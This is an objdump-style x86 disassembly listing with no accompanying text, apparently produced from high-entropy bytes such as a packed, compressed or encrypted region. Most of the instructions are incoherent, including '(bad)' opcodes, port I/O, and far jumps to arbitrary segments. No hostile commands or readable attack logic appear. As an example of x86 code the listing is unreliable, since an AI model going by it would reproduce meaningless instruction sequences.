  42044f:	jge    0x420494
  420451:	xor    ah,ah
  420453:	jl     0x42043a
  420455:	push   es
  420456:	das    
  420457:	pop    ebp
  420458:	jno    0x420488
  42045a:	ficomp DWORD PTR [esp+ebx*1-0x78]
  42045e:	call   0x4e5eef0c
  420463:	add    DWORD PTR [ecx-0x15],esp
  420466:	adc    bh,BYTE PTR [edx+esi*1+0x5e]
  42046a:	int3   
  42046b:	xor    esi,edx
  42046d:	addr16 aaa 
  42046f:	mov    dl,0xc0
  420471:	adc    DWORD PTR [ecx-0x2c8a142a],ebp
  420477:	adc    eax,0x1ce7944
  42047c:	int    0xab
  42047e:	xchg   edi,eax
  42047f:	mov    edi,0x234ac933
  420484:	rol    BYTE PTR ds:0x9455c806,0x5
  42048b:	imul   eax,DWORD PTR [ecx+0x63],0xdf0f3ad0
  420492:	into   
  420493:	and    ebp,DWORD PTR [eax]
  420495:	or     eax,0x7d921d42
  42049a:	nop
  42049b:	enter  0xc5d7,0xd9
  42049f:	dec    ebp
  4204a0:	xchg   esi,eax
  4204a1:	pushf  
  4204a2:	ret    0x504e
  4204a5:	stos   BYTE PTR es:[edi],al
  4204a6:	ror    edx,cl
  4204a8:	das    
  4204a9:	(bad)  
  4204aa:	sbb    BYTE PTR [eax+0x64606b65],ch
  4204b0:	push   ds
  4204b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204b2:	lahf   
  4204b3:	push   edi
  4204b4:	dec    ebp
  4204b5:	adc    ecx,eax
  4204b7:	aam    0x10
  4204b9:	mov    dl,0xae
  4204bb:	cmc    
  4204bc:	sbb    dh,BYTE PTR [ebp+0x5a]
  4204bf:	jge    0x4204db
  4204c1:	sbb    DWORD PTR [eax],ecx
  4204c3:	adc    al,0xed
  4204c5:	jl     0x42053f
  4204c7:	nop
  4204c8:	lods   eax,DWORD PTR ds:[esi]
  4204c9:	dec    BYTE PTR [ebx+ecx*8+0x53]
  4204cd:	pushf  
  4204ce:	adc    ch,BYTE PTR [eax+edi*4+0x266f521a]
  4204d5:	ret    
  4204d6:	fnstenv [ebx+edi*1-0x38cdafde]
  4204dd:	(bad)  
  4204de:	and    al,0x89
  4204e0:	sub    al,0x9f
  4204e2:	out    dx,al
  4204e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204e4:	xchg   BYTE PTR [ebp-0xedf92e5],dl
  4204ea:	shl    DWORD PTR ds:0x35c640d4,1
  4204f0:	cmc    
  4204f1:	dec    ebx
  4204f2:	pusha  
  4204f3:	aaa    
  4204f4:	sub    ebp,esi
  4204f6:	push   esp
  4204f7:	jg     0x4204e0
  4204f9:	sbb    al,0xd8
  4204fb:	shl    ecx,1
  4204fd:	shl    esi,0xf8
  420500:	push   edi
  420501:	stos   BYTE PTR es:[edi],al
  420502:	add    cl,cl
  420504:	sbb    BYTE PTR [edi],dl
  420506:	inc    eax
  420507:	push   eax
  420508:	mov    eax,ds:0x14dd73f7
  42050d:	add    DWORD PTR [eax-0x2f],eax
  420510:	add    eax,0x604b6ce8
  420515:	out    dx,eax
  420516:	fdiv   st(2),st
  420518:	and    DWORD PTR [ebp+0x74],0x284fa759
  42051f:	(bad)  
  420520:	cmp    DWORD PTR [edi-0x2c337fa],eax
  420526:	and    dl,ah
  420528:	(bad)  
  420529:	push   ebp
  42052a:	fs push cs
  42052c:	leave  
  42052d:	in     eax,dx
  42052e:	inc    esi
  42052f:	inc    edx
  420530:	xchg   ebx,eax
  420531:	in     al,dx
  420532:	fs icebp 
  420534:	hlt    
  420535:	loopne 0x42054e
  420537:	dec    ecx
  420538:	imul   esp,DWORD PTR [ebx],0x4df3173c
  42053e:	ss inc esi
  420540:	jge    0x420528
  420542:	fdivr  DWORD PTR [esi+0x42602f85]
  420548:	xchg   esp,eax
  420549:	adc    al,BYTE PTR [esi+0x7e8877e5]
  42054f:	and    eax,DWORD PTR cs:[ebx-0x53]
  420553:	les    ebp,FWORD PTR [eax]
  420555:	xchg   edx,eax
  420556:	bsf    esi,DWORD PTR [ecx*8+0x37a1f3f3]
  42055e:	push   ds
  42055f:	jmp    0x4204e4
  420561:	xchg   ecx,eax
  420562:	cmp    DWORD PTR [ebp-0x4f],eax
  420565:	cmp    dh,al
  420567:	rcr    BYTE PTR [esi+ecx*2],0x57
  42056b:	in     al,dx
  42056c:	mov    ebp,0x752291c0
  420571:	(bad)  
  420572:	mov    esp,0xe552e302
  420577:	add    edx,DWORD PTR [ecx]
  420579:	sti    
  42057a:	and    ecx,DWORD PTR [ebx+0x115c6d48]
  420580:	int3   
  420581:	cmc    
  420582:	enter  0x5649,0xa9
  420586:	fwait
  420587:	std    
  420588:	popf   
  420589:	sti    
  42058a:	cmp    eax,0x26b3ada2
  42058f:	sbb    BYTE PTR [esp+ecx*2],bl
  420592:	(bad)  
  420593:	fldcw  WORD PTR [eax]
  420595:	out    dx,al
  420596:	int3   
  420597:	or     al,0x2a
  420599:	push   esi
  42059a:	shr    al,cl
  42059c:	pusha  
  42059d:	pop    es
  42059e:	jae    0x4205b3
  4205a0:	mov    cl,0x7e
  4205a2:	ss xor esp,ebx
  4205a5:	call   0x856:0x716afa78
  4205ac:	and    edx,DWORD PTR [edi+0x36d1aa91]
  4205b2:	icebp  
  4205b3:	push   esp
  4205b4:	jae    0x4205df
  4205b6:	imul   esi,edx,0x8e0da6bb
  4205bc:	xchg   ecx,eax
  4205bd:	xor    eax,edx
  4205bf:	imul   esi,DWORD PTR [edx],0x34
  4205c2:	sub    bh,BYTE PTR [eax-0x42]
  4205c5:	pop    esp
  4205c6:	ins    BYTE PTR es:[edi],dx
  4205c7:	sbb    ah,BYTE PTR [ecx]
  4205c9:	sub    DWORD PTR [eax],esp
  4205cb:	or     dh,0x9
  4205ce:	dec    eax
  4205cf:	inc    ecx
  4205d0:	out    0x97,al
  4205d2:	push   es
  4205d3:	pop    ebp
  4205d4:	ds cld 
  4205d6:	std    
  4205d7:	or     eax,0x1b72abc6
  4205dc:	in     eax,0x97
  4205de:	pop    ebp
  4205df:	addr16 (bad) 
  4205e1:	jae    0x4205e9
  4205e3:	or     ch,BYTE PTR [eax-0x1a]
  4205e6:	jbe    0x42056e
  4205e8:	adc    eax,0x4a2395b8
  4205ed:	or     eax,0x87077c82
  4205f2:	outs   dx,DWORD PTR ds:[esi]
  4205f3:	push   es
  4205f4:	imul   edx,DWORD PTR [eax],0x306013c1
  4205fa:	neg    BYTE PTR [esi]
  4205fc:	retf   0x9fcc
  4205ff:	inc    edx
  420600:	xor    DWORD PTR [esi],0x3f
  420603:	xchg   edi,eax
  420604:	push   esi
  420605:	push   ecx
  420606:	add    dl,BYTE PTR [eax-0xc605104]
  42060c:	sbb    bl,BYTE PTR [edi+0x60]
  42060f:	jae    0x420642
  420611:	out    dx,al
  420612:	add    al,0xbb
  420614:	ret    
  420615:	mov    esp,0x1be28f45
  42061a:	int3   
  42061b:	ret    
  42061c:	lods   al,BYTE PTR ds:[esi]
  42061d:	push   esp
  42061e:	push   ecx
  42061f:	mul    BYTE PTR [esi-0x7f51c72b]
  420625:	pop    ds
  420626:	cmp    BYTE PTR [ebp+0x667d2b7e],ch
  42062c:	out    0xaf,eax
  42062e:	cs dec ecx
  420630:	loope  0x42069b
  420632:	and    BYTE PTR [ecx+0x29],0x14
  420636:	scas   al,BYTE PTR es:[edi]
  420637:	dec    ebx
  420638:	mov    ah,0x58
  42063a:	cli    
  42063b:	repz add al,0x2d
  42063e:	add    al,0xe4
  420640:	jbe    0x420643
  420642:	inc    edi
  420643:	cwde   
  420644:	add    al,bl
  420646:	mov    BYTE PTR [eax+0x4257a7d7],ah
  42064c:	rol    DWORD PTR ds:0xa51d559e,cl
  420652:	leave  
  420653:	mov    ebp,0xfcc8cbff
  420658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420659:	and    al,0x94
  42065b:	mov    ds:0xff1f4e24,al
  420660:	cmp    bl,BYTE PTR [ecx]
  420662:	out    0xc8,al
  420664:	jnp    0x4206ca
  420666:	cmp    DWORD PTR [edx+0xc],esi
  420669:	jae    0x420681
  42066b:	sbb    ebx,DWORD PTR [ebx+ebp*2-0x1b]
  42066f:	pop    ss
  420670:	imul   ecx,edi,0xfffffff4
  420673:	push   0x6b76404c
  420678:	jnp    0x4205fe
  42067a:	stos   BYTE PTR es:[edi],al
  42067b:	dec    edx
  42067c:	xor    ebp,edi
  42067e:	jb     0x420650
  420680:	js     0x420610
  420682:	inc    ecx
  420683:	push   0x5bbe287b
  420688:	sub    eax,0xafd143e3
  42068d:	sbb    bh,ch
  42068f:	pop    eax
  420690:	scas   eax,DWORD PTR es:[edi]
  420691:	dec    ecx
  420692:	adc    eax,0x5eb78238
  420697:	cli    
  420698:	sbb    BYTE PTR [edi+0x7e],dh
  42069b:	call   0x6a185a2b
  4206a0:	add    al,0xc7
  4206a2:	dec    edi
  4206a3:	les    ebp,FWORD PTR [esi+0x6e]
  4206a6:	cmp    BYTE PTR ds:0xaa8aa57,dl
  4206ac:	sub    al,0xaf
  4206ae:	out    dx,eax
  4206af:	and    eax,0xfc12a044
  4206b4:	and    ecx,DWORD PTR [edi+0x7]
  4206b7:	into   
  4206b8:	pop    ebp
  4206b9:	idiv   esi
  4206bb:	or     eax,0x67ee293c
  4206c0:	pop    ebp
  4206c1:	les    ebx,FWORD PTR [ebp+0x125e81e5]
  4206c7:	aas    
  4206c8:	dec    edx
  4206c9:	dec    ebp
  4206ca:	fwait
  4206cb:	push   ebp
  4206cc:	popa   
  4206cd:	or     eax,0xce537849
  4206d2:	clc    
  4206d3:	imul   edi,DWORD PTR ds:0x576d4d3b,0x6b
  4206da:	jecxz  0x420741
  4206dc:	sbb    eax,0x7cca70d0
  4206e1:	sar    BYTE PTR [esi],1
  4206e3:	sti    
  4206e4:	pop    es
  4206e5:	cld    
  4206e6:	jl     0x4206a2
  4206e8:	fnstsw WORD PTR [eax+0x38]
  4206eb:	aad    0x64
  4206ed:	mov    edx,0xa82058a9
  4206f2:	mov    ds:0xa708aea7,al
  4206f7:	jmp    0x4206fd
  4206f9:	in     eax,0xc4
  4206fb:	pop    ebp
  4206fc:	daa    
  4206fd:	pop    ecx
  4206fe:	repnz jmp 0x701a:0x692e70b7
  420706:	dec    ebx
  420707:	jne    0x42077e
  420709:	repz jnp 0x4206c8
  42070c:	cdq    
  42070d:	xor    eax,0x4bdaf410
  420712:	lods   eax,DWORD PTR ds:[esi]
  420713:	rcl    bh,cl
  420715:	lock add al,0xa8
  420718:	jle    0x420770
  42071a:	jno    0x420740
  42071c:	or     dh,BYTE PTR [edx+0x66]
  42071f:	pop    es
  420720:	xor    dl,BYTE PTR [ebx+0x26]
  420723:	push   0xffffffd7
  420725:	add    DWORD PTR [esi],esi
  420727:	lods   al,BYTE PTR ds:[esi]
  420728:	xchg   edi,eax
  420729:	call   0xca605541
  42072e:	adc    eax,0xcd712af0
  420733:	push   esp
  420734:	pop    es
  420735:	adc    eax,0x20644af2
  42073a:	lea    esi,[ecx+0x5e]
  42073d:	mov    dl,0x8c
  42073f:	mov    edi,0x7f7845af
  420744:	push   0xfffffffd
  420746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420747:	pop    es
  420748:	mov    eax,ds:0x10478aff
  42074d:	push   ds
  42074e:	mov    ecx,0xe8b0a367
  420753:	or     DWORD PTR [ebp+0x5e757551],eax
  420759:	fidiv  DWORD PTR [edx]
  42075b:	jmp    0x2413:0xb4e508fa
  420762:	pop    es
  420763:	adc    cl,cl
  420765:	xchg   ebp,eax
  420766:	jl     0x4206ee
  420768:	mov    ch,al
  42076a:	ds jmp 0x420714
  42076d:	jle    0x4206ff
  42076f:	jmp    0x63cd92dc
  420774:	out    0x2f,eax
  420776:	pop    edx
  420777:	xchg   esi,eax
  420778:	sti    
  420779:	add    eax,0x3f913208
  42077e:	aam    0xa4
  420780:	xchg   edi,eax
  420781:	mov    ch,0x1d
  420783:	xchg   ebx,eax
  420784:	sbb    al,0x8f
  420786:	jb     0x420718
  420788:	stos   BYTE PTR es:[edi],al
  420789:	dec    eax
  42078a:	mov    ebx,0xcc32a8c6
  42078f:	int    0xc6
  420791:	jae    0x4207b7
  420793:	loopne 0x420790
  420795:	arpl   sp,dx
  420797:	push   ebp
  420798:	aaa    
  420799:	inc    esi
  42079a:	sub    eax,0xb9d0bf1a
  42079f:	push   edx
  4207a0:	push   cs
  4207a1:	push   esi
  4207a2:	push   ecx
  4207a3:	mov    dh,0x53
  4207a5:	fimul  WORD PTR ds:0x242517d
  4207ab:	pop    ds
  4207ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ad:	or     eax,0x2e175762
  4207b2:	xchg   esp,eax
  4207b3:	or     ecx,esp
  4207b5:	icebp  
  4207b6:	sub    eax,0x4ddfe5a6
  4207bb:	outs   dx,DWORD PTR ds:[esi]
  4207bc:	jnp    0x420839
  4207be:	gs push edi
  4207c0:	xor    eax,0xea43085b
  4207c5:	sub    eax,0x6805bd05
  4207ca:	mov    dh,0xbc
  4207cc:	(bad)  
  4207cd:	outs   dx,BYTE PTR ds:[esi]
  4207ce:	aam    0xd4
  4207d0:	mov    bh,0x1d
  4207d2:	test   BYTE PTR [eax+0x4d],ah
  4207d5:	push   es
  4207d6:	dec    edi
  4207d7:	jns    0x420823
  4207d9:	adc    BYTE PTR [ebp-0x36],bl
  4207dc:	loopne 0x42078e
  4207de:	imul   edx,DWORD PTR [ebx+0xd],0x876d190c
  4207e5:	scas   al,BYTE PTR es:[edi]
  4207e6:	jecxz  0x42082a
  4207e8:	inc    ebp
  4207e9:	cmp    DWORD PTR [ecx+0xa],ecx
  4207ec:	or     BYTE PTR [ecx-0x2b],cl
  4207ef:	mov    ch,0xfb
  4207f1:	xlat   BYTE PTR ds:[ebx]
  4207f2:	mov    ?,WORD PTR [ebx-0xa]
  4207f5:	mov    esp,DWORD PTR cs:[ecx+0x2d3f91ac]
  4207fc:	imul   ebp,DWORD PTR [ebx+ebx*4+0x5d],0xfffffff8
  420801:	pop    ebp
  420802:	jno    0x4207f7
  420804:	mov    ebx,0x4a21e8ed
  420809:	jae    0x42087e
  42080b:	and    DWORD PTR [ebp+0x790f2917],0x63
  420812:	aad    0xcd
  420814:	clc    
  420815:	jmp    0x947d5754
  42081a:	(bad)
  42081e:	mov    ecx,0xae1c366b
  420823:	xchg   esp,eax
  420824:	mov    DWORD PTR [edx+0x71],0x3dc825b3
  42082b:	inc    eax
  42082c:	add    esp,ebx
  42082e:	call   0xa2fc7f10
  420833:	push   esi
  420834:	inc    edi
  420835:	jnp    0x4207d4
  420837:	hlt    
  420838:	mov    eax,0xe5ae1414
  42083d:	cmp    BYTE PTR [esp+edi*1],bh
  420840:	adc    BYTE PTR [ecx],0xc3
  420843:	in     al,0x9a
  420845:	sbb    BYTE PTR [ecx+ecx*8+0x56],dh
  420849:	xchg   ebp,eax
  42084a:	mov    edx,0xfdd23f14
  42084f:	loope  0x4208a1
  420851:	adc    BYTE PTR [esp+edi*2],dl
  420854:	inc    ebx
  420855:	fdivr  DWORD PTR [ebx-0x60]
  420858:	sahf   
  420859:	in     al,dx
  42085a:	jb     0x4208d9
  42085c:	fcom   DWORD PTR [bp+si+0x62]
  420860:	(bad)  
  420861:	mov    dh,0x64
  420863:	shr    esp,cl
  420865:	jl     0x420801
  420867:	push   es
  420868:	sti    
  420869:	in     eax,dx
  42086a:	pop    ecx
  42086b:	aas    
  42086c:	push   0xffffff9e
  42086e:	cmp    al,0x16
  420870:	inc    esi
  420871:	jnp    0x420857
  420873:	test   BYTE PTR [edi],ah
  420875:	test   BYTE PTR [esi+edx*8+0x65e52c2e],ah
  42087c:	lea    esp,[esi+0x3d]
  42087f:	ret    0xb641
  420882:	xor    ebp,ecx
  420884:	cld    
  420885:	cdq    
  420886:	sub    ch,BYTE PTR [ecx]
  420888:	sbb    cl,BYTE PTR [eax]
  42088a:	xchg   esi,eax
  42088b:	dec    eax
  42088c:	mov    ?,WORD PTR [edx+0x2ec8c4fe]
  420892:	mov    DWORD PTR [eax],esp
  420894:	sub    al,0x8a
  420896:	lock xchg esi,eax
  420898:	dec    ecx
  420899:	adc    bh,0x29
  42089c:	sub    cl,dh
  42089e:	xlat   BYTE PTR ds:[ebx]
  42089f:	inc    ebp
  4208a0:	and    BYTE PTR [ecx],cl
  4208a2:	call   0xb14:0x41f9d0de
  4208a9:	test   eax,0xd2a750b9
  4208ae:	jle    0x420893
  4208b0:	cmp    eax,0x2c3fb39f
  4208b5:	retf   0x60ed
  4208b8:	lods   al,BYTE PTR ds:[esi]
  4208b9:	and    eax,0x364a4650
  4208be:	ficom  DWORD PTR [ecx-0x15788cf7]
  4208c4:	jne    0x4208c3
  4208c6:	push   edx
  4208c7:	and    ebx,DWORD PTR [edx]
  4208c9:	into   
  4208ca:	into   
  4208cb:	pop    ss
  4208cc:	(bad)  
  4208cd:	dec    esi
  4208ce:	inc    edx
  4208cf:	or     esp,DWORD PTR [ebp-0xa88cbf4]
  4208d5:	sbb    esp,DWORD PTR [esi-0x46bb4cf6]
  4208db:	(bad)  
  4208dc:	mov    ds:0x5bd07c48,eax
  4208e1:	or     eax,0xc3e0ee06
  4208e6:	arpl   WORD PTR [ebp-0x653d2096],ax
  4208ec:	and    eax,0x9b25f94d
  4208f1:	sbb    al,0x50
  4208f3:	mov    eax,ds:0x1427f0f6
  4208f8:	pop    es
  4208f9:	fistp  QWORD PTR [ebp-0x350e5b41]
  4208ff:	jle    0x420967
  420901:	loope  0x42095b
  420903:	scas   al,BYTE PTR es:[edi]
  420904:	in     eax,dx
  420905:	(bad)  
  420907:	push   ebp
  420908:	mov    DWORD PTR [ebx-0x773df331],ecx
  42090e:	inc    esi
  42090f:	ror    WORD PTR [esi+0x11b9bf5b],cl
  420916:	or     bl,BYTE PTR [esi]
  420918:	jp     0x4208ed
  42091a:	in     eax,dx
  42091b:	cmp    al,0x69
  42091d:	ret    
  42091e:	cmp    eax,0x52503820
  420923:	fisub  WORD PTR [ebx+edi*4+0x1c]
  420927:	retf   0xb904
  42092a:	or     eax,0xe917d1b2
  42092f:	jne    0x420939
  420931:	int    0x22
  420933:	call   0xb6223d78
  420938:	dec    eax
  420939:	addr16 fs jo 0x4209a4
  42093d:	xchg   esi,eax
  42093e:	in     eax,dx
  42093f:	add    dh,BYTE PTR [edx+edi*4-0x6c3eea3a]
  420946:	inc    eax
  420947:	mov    DWORD PTR ds:0xef52bb84,esp
  42094d:	popa   
  42094e:	push   0x976911f0
  420953:	mov    ebp,0x59f7b506
  420958:	std    
  420959:	(bad)  
  42095a:	shl    BYTE PTR [edi+0x73e340f7],1
  420960:	jae    0x420927
  420962:	xlat   BYTE PTR ds:[ebx]
  420963:	sar    BYTE PTR ds:[ecx+0x47],0xf3
  420968:	(bad)  
  420969:	imul   edi,DWORD PTR [edi-0x70],0x34
  42096d:	xchg   esp,eax
  42096e:	test   al,0x4e
  420970:	in     eax,dx
  420971:	sbb    bl,dh
  420973:	and    edx,edx
  420975:	outs   dx,BYTE PTR ds:[esi]
  420976:	push   esi
  420977:	fidiv  DWORD PTR [eax]
  420979:	dec    edx
  42097a:	inc    edx
  42097b:	aas    
  42097c:	test   al,0x9b
  42097e:	enter  0x28e0,0x9b
  420982:	xlat   BYTE PTR ds:[ebx]
  420983:	shl    BYTE PTR [ebp+0x40],1
  420986:	outs   dx,BYTE PTR ds:[esi]
  420987:	inc    ecx
  420988:	lahf   
  420989:	add    dh,BYTE PTR [eax]
  42098b:	push   edx
  42098c:	push   ss
  42098d:	stc    
  42098e:	inc    ebx
  42098f:	lahf   
  420990:	adc    al,0xb1
  420992:	addr16 cdq 
  420994:	jl     0x42099e
  420996:	adc    al,cl
  420998:	icebp  
  420999:	loope  0x42092b
  42099b:	je     0x4209ba
  42099d:	push   ss
  42099e:	pushf  
  42099f:	and    al,0xc0
  4209a1:	xchg   esi,eax
  4209a2:	ins    BYTE PTR es:[edi],dx
  4209a3:	sub    eax,0x258cdcff
  4209a8:	jns    0xbf4436d0
  4209ae:	into   
  4209af:	xchg   ebx,eax
  4209b0:	adc    al,ah
  4209b2:	inc    edx
  4209b3:	pop    es
  4209b4:	jbe    0x4209de
  4209b6:	rol    DWORD PTR [eax],1
  4209b8:	jp     0x420966
  4209ba:	mov    esp,0x41d23bac
  4209bf:	push   cs
  4209c0:	ins    DWORD PTR es:[edi],dx
  4209c1:	xor    al,0xe7
  4209c3:	xchg   DWORD PTR [edi+ebx*4-0x7c1df33e],ecx
  4209ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209cb:	in     eax,dx
  4209cc:	int3   
  4209cd:	fsubrp st(0),st
  4209cf:	out    0x39,eax
  4209d1:	or     BYTE PTR [eax+0x4d],0xa9
  4209d5:	mov    al,0x5d
  4209d7:	inc    ebp
  4209d8:	hlt    
  4209d9:	(bad)  
  4209da:	jmp    0x73333d8
  4209df:	sbb    al,0x26
  4209e1:	or     BYTE PTR [esi-0x5a],0xb9
  4209e5:	inc    edx
  4209e6:	add    bh,BYTE PTR [esp+eax*1-0x39]
  4209ea:	mov    ds:0x68f36009,eax
  4209ef:	jae    0x420a4b
  4209f1:	inc    esi
  4209f2:	in     eax,dx
  4209f3:	mov    bl,0x51
  4209f5:	adc    BYTE PTR [eax+0xd5bd0a3],0x4
  4209fc:	out    dx,al
  4209fd:	push   ecx
  4209fe:	inc    esp
  4209ff:	out    0xa7,al
  420a01:	or     bl,BYTE PTR [esi+ebp*2]
  420a04:	sti    
  420a05:	(bad)  
  420a06:	cli    
  420a07:	ja     0x420a4e
  420a09:	mov    ?,WORD PTR [esi-0x6a065d7c]
  420a0f:	sub    al,BYTE PTR ds:0x8aea3d10
  420a15:	int3   
  420a16:	cld    
  420a17:	inc    edx
  420a18:	pop    edx
  420a19:	xchg   ebx,eax
  420a1a:	sub    cl,al
  420a1c:	push   ecx
  420a1d:	add    eax,0x80c370af
  420a22:	test   BYTE PTR [esi],al
  420a24:	loop   0x420a88
  420a26:	xor    ah,BYTE PTR [edi]
  420a28:	adc    al,0xb3
  420a2a:	jge    0x420a04
  420a2c:	outs   dx,BYTE PTR ds:[esi]
  420a2d:	push   ebx
  420a2e:	popf   
  420a2f:	jmp    0xe4508008
  420a34:	sar    DWORD PTR [edx+0xccaf1a6],1
  420a3a:	sti    
  420a3b:	or     al,0x21
  420a3d:	out    0x5b,eax
  420a3f:	leave  
  420a40:	pop    edi
  420a41:	(bad)  
  420a42:	pop    esp
  420a43:	sbb    eax,0x6d019a76
  420a48:	retf   0xc193
  420a4b:	pop    ecx
  420a4c:	ja     0x4209d0
  420a4e:	mov    ?,WORD PTR [edx+0x522af688]
  420a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a55:	cmp    ecx,0xffffff83
  420a58:	and    ebx,ebx
  420a5a:	add    al,0xe3
  420a5c:	(bad)  
  420a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a5e:	ja     0x4209fb
  420a60:	mov    bl,0x69
  420a62:	clc    
  420a63:	push   0x59486971
  420a68:	pop    ebp
  420a69:	std    
  420a6a:	push   ebx
  420a6b:	mov    ecx,0xe9d868d6
  420a70:	xlat   BYTE PTR ds:[ebx]
  420a71:	add    al,0x90
  420a73:	cs (bad) 
  420a75:	int3   
  420a76:	pop    esp
  420a77:	and    dl,BYTE PTR ds:0xeb3b9cf9
  420a7d:	cmp    cl,BYTE PTR [edx+0x79f8dcf8]
  420a83:	dec    edi
  420a84:	rcl    DWORD PTR [ecx+0x2a],cl
  420a87:	outs   dx,BYTE PTR ds:[esi]
  420a88:	or     cl,BYTE PTR [ebx+0x19e0f3f4]
  420a8e:	xlat   BYTE PTR ds:[ebx]
  420a8f:	pop    ds
  420a90:	xchg   esp,eax
  420a91:	lea    eax,[eax]
  420a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a94:	xor    edx,ebp
  420a96:	aas    
  420a97:	out    0x6c,eax
  420a99:	xor    dh,bl
  420a9b:	dec    ebp
  420a9c:	iret   
  420a9d:	inc    esi
  420a9e:	push   0xffffffd3
  420aa0:	les    edx,FWORD PTR [edi]
  420aa2:	mov    cl,0x4d
  420aa4:	dec    ebx
  420aa5:	jle    0x420a34
  420aa7:	mov    ch,0xc1
  420aa9:	iret   
  420aaa:	jge    0x420a5d
  420aac:	inc    esi
  420aad:	cmp    al,0x7d
  420aaf:	jne    0x420af6
  420ab1:	xor    DWORD PTR [edi+0x7f],edi
  420ab4:	dec    DWORD PTR [esi+0x18709432]
  420aba:	repz xlat BYTE PTR fs:[ebx]
  420abd:	and    al,BYTE PTR [edi+0x8b431df]
  420ac3:	sahf   
  420ac4:	fcmovnb st,st(5)
  420ac6:	push   ecx
  420ac7:	sbb    edx,DWORD PTR [esi+0x7580297c]
  420acd:	jae    0x420add
  420acf:	test   al,0xf3
  420ad1:	cmp    al,0xca
  420ad3:	cmp    esp,DWORD PTR [ebx]
  420ad5:	sub    al,0x87
  420ad7:	push   es
  420ad8:	hlt    
  420ad9:	pop    eax
  420ada:	push   0xee6f442c
  420adf:	inc    ecx
  420ae0:	pop    ebp
  420ae1:	(bad)  
  420ae2:	jg     0x420b3e
  420ae4:	cs leave 
  420ae6:	inc    esi
  420ae7:	mov    al,ds:0x2235c5b5
  420aec:	scas   eax,DWORD PTR es:[edi]
  420aed:	jg     0x420aa9
  420aef:	call   0xa0b5:0xfbad1986
  420af6:	adc    bl,BYTE PTR [edi+0x3a]
  420af9:	add    esp,DWORD PTR [esi]
  420afb:	add    eax,0xb915b00d
  420b00:	adc    DWORD PTR [edx],esp
  420b02:	jmp    0x420b03
  420b04:	and    DWORD PTR [ebp-0x49af6213],edx
  420b0a:	mov    BYTE PTR [ecx],ch
  420b0c:	and    DWORD PTR [eax+0x5a],edx
  420b0f:	and    dh,BYTE PTR [edi]
  420b11:	push   ecx
  420b12:	imul   ebx,DWORD PTR [edi-0x23],0x6b
  420b16:	sbb    DWORD PTR [ecx],ecx
  420b18:	pop    esi
  420b19:	xor    edi,0x33
  420b1c:	leave  
  420b1d:	out    0x40,eax
  420b1f:	test   al,0xbf
  420b21:	cmp    DWORD PTR [edx],ebp
  420b23:	jge    0x420b69
  420b25:	jnp    0x420b69
  420b27:	mov    eax,0x68cb5d6a
  420b2c:	lock retf 0x22b1
  420b30:	(bad)  
  420b31:	stc    
  420b32:	pop    es
  420b33:	cli    
  420b34:	or     al,0xcc
  420b36:	xor    BYTE PTR [eax+0x67c5d784],cl
  420b3c:	out    dx,eax
  420b3d:	int3   
  420b3e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420b40:	xor    DWORD PTR [ebx+0x38],esi
  420b43:	pop    es
  420b44:	adc    eax,0x668dc54f
  420b49:	stos   BYTE PTR es:[edi],al
  420b4a:	test   DWORD PTR [eax-0x4044e207],0xbf366cb5
  420b54:	cmp    al,0xa5
  420b56:	pop    ecx
  420b57:	cmp    ch,BYTE PTR [ebx+eax*8]
  420b5a:	sub    esi,DWORD PTR [esi-0xc19200b]
  420b60:	jne    0x420b48
  420b62:	test   eax,0xc2464d13
  420b67:	mov    ebp,0xe6373711
  420b6c:	or     eax,0x25b08b3f
  420b71:	add    eax,0x13c6db20
  420b76:	in     eax,0xfc
  420b78:	mov    dh,0xdc
  420b7a:	fstp   TBYTE PTR [esi+0x30]
  420b7d:	aam    0x29
  420b7f:	in     eax,dx
  420b80:	pop    es
  420b81:	pop    ebx
  420b82:	call   0x7228c925
  420b87:	outs   dx,DWORD PTR ds:[esi]
  420b88:	cmp    BYTE PTR [edx-0x3639fc5e],dh
  420b8e:	ja     0x420be1
  420b90:	je     0x420b26
  420b92:	push   ss
  420b93:	(bad)
  420b96:	fsubr  st,st(6)
  420b98:	test   al,0x31
  420b9a:	ss lahf 
  420b9c:	pop    es
  420b9d:	add    cl,ch
  420b9f:	mov    al,ds:0x70c35667
  420ba4:	xchg   esp,eax
  420ba5:	xor    DWORD PTR [ecx-0x4d],eax
  420ba8:	jae    0x420b7c
  420baa:	cdq    
  420bab:	sbb    DWORD PTR [ecx+0x43],edi
  420bae:	(bad)  
  420baf:	dec    edi
  420bb0:	or     BYTE PTR ds:0xe552809c,al
  420bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bb7:	xchg   ecx,eax
  420bb8:	mov    al,0x46
  420bba:	push   edx
  420bbb:	xor    bl,BYTE PTR [edx+ecx*2-0xad4ee2b]
  420bc2:	clc    
  420bc3:	xor    esi,edi
  420bc5:	jge    0x420b52
  420bc7:	and    edx,edx
  420bc9:	xlat   BYTE PTR ds:[ebx]
  420bca:	dec    edx
  420bcb:	push   edx
  420bcc:	hlt    
  420bcd:	ins    DWORD PTR es:[edi],dx
  420bce:	pop    ds
  420bcf:	mov    edx,db6
  420bd2:	fldenv [ebx]
  420bd4:	shr    bh,0x4b
  420bd7:	stos   BYTE PTR es:[edi],al
  420bd8:	sub    al,0x4a
  420bda:	aaa    
  420bdb:	jb     0x420b88
  420bdd:	scas   eax,DWORD PTR es:[edi]
  420bde:	mov    esi,DWORD PTR [edi+0x7dca2a99]
  420be4:	in     al,dx
  420be5:	or     edi,DWORD PTR [edx-0x6a16785]
  420beb:	dec    eax
  420bec:	aad    0x6b
  420bee:	push   ss
  420bef:	pop    ds
  420bf0:	sub    BYTE PTR [ecx-0x1aeabee7],ch
  420bf6:	das    
  420bf7:	hlt    
  420bf8:	enter  0x709d,0xa6
  420bfc:	sub    edi,edx
  420bfe:	sbb    DWORD PTR [eax+0x760acb1f],0x93c28d0d
  420c08:	mov    al,ds:0x376c3f24
  420c0d:	rcr    DWORD PTR [edx+0x4e],cl
